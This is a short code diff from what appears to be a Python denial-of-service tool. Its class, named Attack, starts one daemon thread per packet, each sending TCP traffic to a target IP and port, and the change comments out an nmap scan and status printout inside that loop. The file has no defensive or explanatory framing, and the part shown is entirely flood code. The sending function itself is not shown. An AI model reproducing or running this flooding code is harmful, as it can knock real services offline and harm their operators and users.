@@ -13,11 +13,11 @@ class Attack:
 		for x in range(int(self.packets)):
 			threading.Thread(target=tcp_sender, args=(self.ip, self.port), daemon=True).start()
 			total+=1
-			scanner = nmap.PortScanner()
-			host = socket.gethostbyname(self.ip)
-			scanner.scan(host)
-			status = scanner[host].state().replace('up', f'{colors.reset}{colors.green}ONLINE{colors.reset}').replace('down', f'{colors.reset}{colors.red}OFFLINE{colors.reset}')
-			Debug(f'[*] {total} packages have been sent {colors.reset}[{status}]', verbose=True)
+			# scanner = nmap.PortScanner()
+			# host = socket.gethostbyname(self.ip)
+			# scanner.scan(host)
+			# status = scanner[host].state().replace('up', f'{colors.reset}{colors.green}ONLINE{colors.reset}').replace('down', f'{colors.reset}{colors.red}OFFLINE{colors.reset}')
+			# Debug(f'[*] {total} packages have been sent {colors.reset}[{status}]', verbose=True)
 		Debug(f'[+] Sent {total} packets', verbose=True)
 
 
